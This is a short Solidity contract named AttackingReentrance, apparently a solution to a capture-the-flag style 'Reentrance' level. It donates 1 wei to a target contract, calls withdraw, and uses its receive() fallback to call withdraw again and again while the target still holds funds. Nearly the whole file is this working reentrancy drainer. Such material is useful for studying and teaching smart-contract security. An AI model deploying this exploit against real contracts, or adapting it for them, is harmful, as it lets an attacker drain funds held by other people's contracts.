// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    Reentrance private victim;

    constructor(address payable _contractAddress) payable {
        victim = Reentrance(_contractAddress);
    }

    function hackContract() external {
        victim.donate{value: 1}(address(this));
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance >= 1) {
            victim.withdraw();
        }
    }
}
